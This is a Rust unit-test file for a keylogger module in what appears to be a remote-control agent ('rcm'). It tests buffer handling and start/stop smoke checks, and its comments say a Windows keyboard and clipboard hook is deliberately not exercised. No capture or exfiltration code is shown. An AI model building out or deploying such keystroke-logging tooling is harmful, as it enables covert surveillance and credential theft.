// tests/test_keylogger.rs
//
// Unit tests for src/agent/keylogger.rs — buffer management only.
//
// The OS-level keyboard/clipboard hooks are deliberately NOT called here:
//   • start() installs a system hook on Windows that would interfere with
//     the test runner's own input handling.
//   • On Linux/macOS start() returns early (unsupported), so the hook path
//     is a no-op anyway.
//
// Instead we test the buffer initialisation, read/write, and get_logs()
// path — the logic that runs on every platform regardless of OS support.

use rcm::agent::keylogger;

// ─────────────────────────────────────────────────────────────────────────────
// Buffer management
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn init_buffer_returns_arc_mutex_string() {
    let buf = keylogger::init_buffer();
    // Verify we can lock and write to it.
    {
        let mut guard = buf.lock().unwrap();
        *guard = "test_content".to_string();
    }
    let guard = buf.lock().unwrap();
    assert_eq!(*guard, "test_content");
}

#[test]
fn get_buffer_returns_some_after_init() {
    // init_buffer installs the global buffer via OnceLock.
    let _buf = keylogger::init_buffer();
    let maybe_buf = keylogger::get_buffer();
    assert!(maybe_buf.is_some(), "get_buffer should return Some after init_buffer");
}

#[test]
fn get_logs_returns_string_after_init() {
    keylogger::init_buffer();
    let logs = keylogger::get_logs();
    // Logs may be empty or contain prior content — just verify no panic and
    // returns a String.
    let _: &str = &logs;
}

#[test]
fn write_to_buffer_readable_via_get_buffer() {
    let buf = keylogger::init_buffer();
    {
        let mut guard = buf.lock().unwrap();
        guard.push_str("[KEY:a][KEY:b][KEY:c]");
    }
    // get_buffer() returns a reference to the global Arc<Mutex<String>>.
    if let Some(global_buf) = keylogger::get_buffer() {
        let content = global_buf.lock().unwrap().clone();
        assert!(
            content.contains("[KEY:a]") ||
            content.contains("[KEY:b]") ||
            content.contains("[KEY:c]"),
            "written keys should be readable via get_buffer: {:?}", content
        );
    }
}

#[test]
fn init_buffer_is_idempotent() {
    // Calling init_buffer twice should not panic (OnceLock semantics).
    let _buf1 = keylogger::init_buffer();
    let _buf2 = keylogger::init_buffer();
    // Both should refer to the same underlying data.
    let b1 = keylogger::get_buffer().expect("buffer should exist");
    let b2 = keylogger::get_buffer().expect("buffer should still exist");
    // Write via b1, read via b2.
    b1.lock().unwrap().push_str("__idempotent__");
    let content = b2.lock().unwrap().clone();
    assert!(content.contains("__idempotent__"),
        "both Arc refs should point to the same buffer");
}

// ─────────────────────────────────────────────────────────────────────────────
// start() / stop() — smoke tests (no assertions on output content)
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn start_does_not_panic() {
    // On Linux/macOS this returns "Not supported" or similar.
    // On Windows (in CI without a real session) it may also fail gracefully.
    // We only verify it doesn't panic.
    let result = keylogger::start();
    let _: &str = &result;
}

#[test]
fn stop_after_start_does_not_panic() {
    keylogger::start();
    let result = keylogger::stop();
    let _: &str = &result;
}

#[test]
fn get_logs_after_start_stop_returns_string() {
    keylogger::init_buffer();
    keylogger::start();
    // Let it run for a trivially short time.
    std::thread::sleep(std::time::Duration::from_millis(50));
    keylogger::stop();
    let logs = keylogger::get_logs();
    // Content will be empty in a headless test environment — just verify no panic.
    let _: &str = &logs;
}

// ─────────────────────────────────────────────────────────────────────────────
// Thread safety
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn buffer_is_thread_safe() {
    let buf = keylogger::init_buffer();
    let handles: Vec<_> = (0..4).map(|i| {
        let b = buf.clone();
        std::thread::spawn(move || {
            let mut g = b.lock().unwrap();
            g.push_str(&format!("[thread_{}]", i));
        })
    }).collect();
    for h in handles { h.join().unwrap(); }
    let content = buf.lock().unwrap().clone();
    for i in 0..4 {
        assert!(content.contains(&format!("[thread_{}]", i)),
            "thread {} write missing from buffer: {}", i, content);
    }
}
